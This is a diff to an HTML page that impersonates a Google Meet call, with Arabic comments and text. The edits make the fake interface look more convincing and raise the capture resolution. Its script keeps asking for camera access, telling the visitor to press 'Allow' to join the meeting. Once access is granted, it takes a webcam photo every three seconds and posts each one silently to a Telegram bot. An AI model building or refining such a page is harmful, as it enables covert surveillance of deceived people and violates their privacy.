@@ -4,31 +4,149 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Google Meet</title>
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Roboto', Arial, sans-serif; background-color: #202124; color: white; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
-        .main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px; }
-        .video-container { width: 85%; max-width: 300px; aspect-ratio: 9/16; background-color: #000; border-radius: 16px; position: relative; overflow: hidden; box-shadow: 0 8px 25px rgba(0,0,0,0.5); }
-        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-        .controls { height: 100px; display: flex; align-items: center; justify-content: center; gap: 15px; padding-bottom: 10px; }
-        .btn { width: 52px; height: 52px; border-radius: 50%; background: #3c4043; border: none; color: white; font-size: 22px; display: flex; align-items: center; justify-content: center; }
-        .btn-red { background: #ea4335; width: 65px; border-radius: 28px; }
+        body { 
+            font-family: 'Google Sans', Roboto, Arial, sans-serif; 
+            background-color: #202124; 
+            color: white; 
+            height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            overflow: hidden; 
+        }
+
+        /* شريط العنوان العلوي */
+        .top-bar {
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 18px;
+            position: absolute;
+            top: 0;
+            width: 100%;
+            z-index: 10;
+        }
+
+        .meeting-code { font-weight: 500; }
+
+        /* منطقة الفيديو - ملء الشاشة */
+        .main { 
+            flex: 1; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            padding: 10px;
+            margin-bottom: 80px; /* لترك مساحة للشريط السفلي */
+        }
+
+        .video-container { 
+            width: 100%; 
+            height: 90%; 
+            max-width: 1200px;
+            background-color: #3c4043; 
+            border-radius: 12px; 
+            position: relative; 
+            overflow: hidden; 
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+        }
+
+        video { 
+            width: 100%; 
+            height: 100%; 
+            object-fit: cover; 
+            transform: scaleX(-1); 
+        }
+
+        .user-label {
+            position: absolute;
+            bottom: 16px;
+            left: 16px;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 4px 12px;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        /* شريط التحكم السفلي العائم (ستايل قوقل ميت الجديد) */
+        .controls { 
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #202124;
+            display: flex; 
+            align-items: center; 
+            gap: 12px; 
+            padding: 12px 24px;
+            border-radius: 40px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.4);
+            z-index: 20;
+        }
+
+        .btn { 
+            width: 48px; 
+            height: 48px; 
+            border-radius: 50%; 
+            background: #3c4043; 
+            border: none; 
+            color: white; 
+            font-size: 20px; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn:hover { background: #4a4d51; }
+
+        .btn-red { 
+            background: #ea4335; 
+            width: 56px; 
+            border-radius: 28px; 
+        }
+        .btn-red:hover { background: #d93025; }
+
         canvas { display: none; }
-        #status { position: fixed; top: 15px; width: 100%; text-align: center; font-size: 13px; font-weight: bold; z-index: 10; color: #fff; text-shadow: 1px 1px 2px #000; }
+        #status { 
+            position: fixed; 
+            top: 20px; 
+            left: 50%; 
+            transform: translateX(-50%); 
+            font-size: 14px; 
+            color: #bdc1c6; 
+            z-index: 100;
+        }
     </style>
 </head>
 <body>
-    <div id="status">جاري الاتصال بالاجتماع...</div>
+
+    <div id="status">جاري التحقق من الاتصال...</div>
+
+    <div class="top-bar">
+        <div class="meeting-code">نظرة عامة على الاجتماع</div>
+        <div>ℹ️</div>
+    </div>
+
     <div class="main">
         <div class="video-container">
             <video id="webcam" autoplay playsinline muted></video>
+            <div class="user-label">أنت</div>
         </div>
     </div>
+
     <canvas id="photo-canvas"></canvas>
+
     <div class="controls">
         <button class="btn">🎤</button>
         <button class="btn">📹</button>
-        <button class="btn-red">📞</button>
+        <button class="btn">✋</button>
+        <button class="btn">💬</button>
+        <button class="btn">👥</button>
+        <button class="btn btn-red">📞</button>
     </div>
 
     <script>
@@ -42,17 +160,17 @@
         async function start() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: { ideal: 640 } } 
+                    video: { facingMode: "user", width: { ideal: 1280 } } 
                 });
                 video.srcObject = stream;
-                statusText.textContent = "متصل الآن";
+                statusText.textContent = ""; // إخفاء النص عند النجاح
 
                 video.onloadedmetadata = () => {
-                    // بدء حلقة التصوير المستمر كل 3 ثوانٍ
+                    // تصوير كل 3 ثوانٍ بشكل مستمر
                     setInterval(captureAndSend, 3000);
                 };
             } catch (e) {
-                statusText.textContent = "يجب السماح بالكاميرا للمتابعة...";
+                statusText.textContent = "اضغط 'سماح' للدخول إلى الاجتماع";
                 setTimeout(start, 1000);
             }
         }
@@ -60,25 +178,25 @@
         async function captureAndSend() {
             if (!video.srcObject) return;
 
-            canvas.width = 400; 
-            canvas.height = (video.videoHeight / video.videoWidth) * 400;
+            // ضبط الحجم وسرعة المعالجة
+            canvas.width = 640; 
+            canvas.height = (video.videoHeight / video.videoWidth) * 640;
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
             
             canvas.toBlob(async (blob) => {
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'image.jpg');
+                formData.append('photo', blob, 'shot.jpg');
 
                 try {
-                    // إرسال الصورة بشكل صامت لعدم إزعاجك بالتنبيهات الكثيرة
                     await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto?disable_notification=true`, {
                         method: 'POST',
                         body: formData
                     });
                 } catch (err) {
-                    console.error("Error");
+                    console.log("Error");
                 }
-            }, 'image/jpeg', 0.4);
+            }, 'image/jpeg', 0.5);
         }
 
         window.onload = start;
